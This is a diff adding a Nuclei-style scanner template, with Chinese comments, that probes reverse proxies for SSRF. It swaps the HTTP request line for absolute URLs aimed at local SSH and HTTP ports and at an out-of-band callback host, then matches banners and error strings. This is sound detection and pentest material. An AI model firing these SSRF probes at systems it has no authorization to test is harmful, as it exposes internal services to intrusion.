@@ -1,0 +1,60 @@
+id: ssrf-via-proxy-fuzz-enhanced
+
+info:
+  name: SSRF via Proxy Misconfiguration (Enhanced Fuzz)
+  author: iman (refined)
+  severity: high
+  description: |
+    检测代理服务器（Reverse Proxy）是否允许将请求行替换为绝对 URL。
+    支持检测本地端口回显 (SSH) 和 OAST 带外连接。
+  tags: ssrf,proxy,oast,fuzz,unsafe
+
+http:
+  - raw:
+      - |+
+        {{method}} {{fuzz_url}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    unsafe: true # 必须开启，允许构造非标准的 HTTP 第一行
+    
+    # 这里的 payloads 用于替代原始的 verb 列表
+    payloads:
+      method:
+        - GET
+        - POST
+        - CONNECT
+      fuzz_url:
+        - "http://127.0.0.1:22"            # 探测本地 SSH 端口
+        - "http://{{interactsh-url}}"     # 探测带外连接 (OAST)
+        - "http://localhost:80"           # 探测本地 HTTP 端口
+
+    stop-at-first-match: false
+    
+    matchers-condition: or
+    matchers:
+      # 1. 匹配 SSH 回显
+      - type: word
+        name: ssh-echo
+        part: body
+        words:
+          - "SSH-"
+          - "OpenSSH"
+          - "Protocol mismatch"
+        condition: or
+
+      # 2. 匹配 OAST 交互 (DNS/HTTP 收到请求)
+      - type: word
+        name: oast-interact
+        part: interactsh_protocol # 检查 interactsh 的交互记录
+        words:
+          - "dns"
+          - "http"
+
+      # 3. 匹配特定的 HTTP 错误特征 (有些 WAF 转发后会暴露内部错误)
+      - type: word
+        name: proxy-error
+        part: body
+        words:
+          - "failed to connect to 127.0.0.1"
+          - "Connection refused"
